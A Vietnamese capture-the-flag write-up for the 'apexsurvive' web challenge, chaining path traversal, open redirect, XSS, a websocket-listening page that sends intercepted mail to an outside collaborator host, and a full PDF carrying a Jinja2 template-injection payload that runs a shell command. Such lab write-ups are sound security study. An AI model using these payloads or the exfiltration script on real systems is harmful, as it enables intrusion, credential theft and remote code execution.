# The challenge
name: apexsurvive

difficulty: insane
# Solution
Ở bài này, mục tiêu của ta sẽ là bằng cách nào đó đọc được file `/root/flag`, đề cho binary `/readflag` và set permission file flag là `600` nên có thể mục tiêu của ta sẽ là thực hiện RCE rồi sau đó chạy `/readflag` để đọc flag, tuy nhiên uwsgi lại được chạy với user là `root` do đó ta chỉ cần đọc được file là được, hẳn đây là một lỗi configuration của author. Do bài này tác giả đã có writeup nên mình sẽ viết lại một unintend solution do mình và anh `@AP` tìm được
## RCE
Ta thấy ở endpoint `/challenge/addContract` cho phép ta upload một file pdf, file pdf sẽ được check bằng thư viện `PyPDF2`, tên file được join với path upload bằng `os.path.join` dẫn đến việc ta có thể thực hiện path traversal thông qua tên file

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/e195abf8-5d86-4b46-8ca3-4dd0cab6363d)

Từ đó ta có thể ghi đè file template tại `/app/templates/info.html` để thực hiện RCE. Tuy nhiên trước đó ta sẽ cần tìm cách để reach được tính năng upload pdf vì account cần thỏa 2 điều kiện đó là `isAdmin` và `isInternal`. Về `isAdmin` thì chỉ được set duy nhất cho account `xclow3n@apexsurvive.htb` và không có logic để set cho account khác, còn đối với isInternal có thể được set khi email của account có hostname là `apexsurvive.htb`. Tuy nhiên thì để activate account ta cần có OTP và ta chỉ có thể nhận được OTP bằng mail `test@email.htb`
## Hogmail
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/32a7724c-35f6-4898-bd95-13631ccb6428)

Sau 1 ngày đau đầu anh `@AP` có để ý một chi tiết, hogmail có listen một UI trong internal network

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/c20b019a-3b46-4c73-b1be-509c43811a12)
Ở UI để ý thấy ứng dụng cập nhật email realtime, vậy nghĩa là sẽ có một websocket đang chạy, do bot chung network với hogmail nên ta chỉ cần gửi cho bot một đường link chứa đoạn script listen websocket từ hogmail, sau đó fetch nội dung mail đến webhook của mình là được. Bot khi report một product id thì id sẽ được nối với `/challenge/product/<id>` nên ta có thể dùng `../` traverse ngược về `/external` sau đó lợi dụng open redirect tại đây để điều hướng đến web page của mình
```html
<!DOCTYPE html>
<html>
<body>
    <script>
        const ws = new WebSocket("ws://localhost:9000/api/v2/websocket");
        ws.addEventListener("message", (e) => {
            fetch("https://bva4x50d99zxq0qni9bcupa0mrsigj48.oastify.com/?m="+btoa(e.data))
        })
    </script>
</body>
</html>
```

## PDF 
Sau khi tạo được product, ta thấy rằng tại trang hiển thị product có một XSS khá rõ ràng tồn, cái này cùng với Hogmail là unintended của author

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/346751a3-157a-41da-b67d-142b48d161b5)

Từ đó ta có thể XSS để lấy cookie của admin, dùng account admin upload lên một PDF chứa template string execute OS command để RCE, vấn đề ở đây là ta sẽ chèn payload vào phần nào trong PDF. Nếu như các bạn để ý thì các PDF được gen từ các phần mềm như PDFlatex thì phần cuối của pdf sẽ có một dòng "created by ...." và tất nhiên là nó không hiển thị trên nội dung PDF, do đó mình chọn cách chèn payload vào phần `trailer` của pdf. Ngoài ra thì file PDF cũng không được có unicode vì tí nữa vào jinja2 xử lý sẽ bị lỗi. Cách làm của mình là đầu tiên mình lên lụm một cái polyglot của portswigger research về sau đó thêm payload tại `trailer` là được
https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/jsPDF/chrome/pdf-ssrf/output.pdf

Sau khi ghi đè file template thì do cache nên ta refresh lại vài lần thì flag sẽ hiện ra. File pdf:
```
%PDF-1.3
%1234
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/MediaBox [0 0 595.2799999999999727 841.8899999999999864]
/Annots [
<</Type /Annot /Subtype /Link /Rect [0. 813.5435433070865656 566.9291338582677326 246.614409448818833] /Border [0 0 0] /A <</S /URI /URI (#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(Abc)/V(blah)>>/A<</S/JavaScript/JS(
app.alert(1);
this.submitForm('https://aiws4u6uubgfdag94xvc5wbrfilc91.burpcollaborator.net', false, false, ['Abc']);
)/() >> >>
]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 126
>>
stream
0.5670000000000001 w
0 G
BT
/F1 16 Tf
18.3999999999999986 TL
0 g
56.6929133858267775 785.1970866141732586 Td
(Test text) Tj
ET
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
>>
endobj
5 0 obj
<<
/Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
6 0 obj
<<
/Type /Font
/BaseFont /Helvetica-Bold
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
7 0 obj
<<
/Type /Font
/BaseFont /Helvetica-Oblique
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
8 0 obj
<<
/Type /Font
/BaseFont /Helvetica-BoldOblique
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
9 0 obj
<<
/Type /Font
/BaseFont /Courier
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
10 0 obj
<<
/Type /Font
/BaseFont /Courier-Bold
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
11 0 obj
<<
/Type /Font
/BaseFont /Courier-Oblique
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
12 0 obj
<<
/Type /Font
/BaseFont /Courier-BoldOblique
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
13 0 obj
<<
/Type /Font
/BaseFont /Times-Roman
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
14 0 obj
<<
/Type /Font
/BaseFont /Times-Bold
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
15 0 obj
<<
/Type /Font
/BaseFont /Times-Italic
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
16 0 obj
<<
/Type /Font
/BaseFont /Times-BoldItalic
/Subtype /Type1
/Encoding /WinAnsiEncoding
/FirstChar 32
/LastChar 255
>>
endobj
17 0 obj
<<
/Type /Font
/BaseFont /ZapfDingbats
/Subtype /Type1
/FirstChar 32
/LastChar 255
>>
endobj
18 0 obj
<<
/Type /Font
/BaseFont /Symbol
/Subtype /Type1
/FirstChar 32
/LastChar 255
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
/F2 6 0 R
/F3 7 0 R
/F4 8 0 R
/F5 9 0 R
/F6 10 0 R
/F7 11 0 R
/F8 12 0 R
/F9 13 0 R
/F10 14 0 R
/F11 15 0 R
/F12 16 0 R
/F13 17 0 R
/F14 18 0 R
>>
/XObject <<
>>
>>
endobj
19 0 obj
<<
/Producer (jsPDF 2.1.1)
/CreationDate (D:20201020103513+01'00')
>>
endobj
20 0 obj
<<
/Type /Catalog
/Pages 1 0 R
/OpenAction [3 0 R /FitH null]
/PageLayout /OneColumn
>>
endobj
xref
0 21
0000000000 65535 f
0000000714 00000 n
0000002531 00000 n
0000000015 00000 n
0000000537 00000 n
0000000771 00000 n
0000000896 00000 n
0000001026 00000 n
0000001159 00000 n
0000001296 00000 n
0000001419 00000 n
0000001548 00000 n
0000001680 00000 n
0000001816 00000 n
0000001944 00000 n
0000002071 00000 n
0000002200 00000 n
0000002333 00000 n
0000002435 00000 n
0000002779 00000 n
0000002865 00000 n
trailer
<<
/Size 21
/PTEX.Fullbanner ({{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}})
/Root 20 0 R
/Info 19 0 R
/ID [ <473612F0110D3914940DD4F61756820F> <473612F0110D3914940DD4F61756820F> ]
>>
startxref
2969
%%EOF
```

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/8bc04b89-5fb2-47f6-a8e7-202bdf13b8fb)
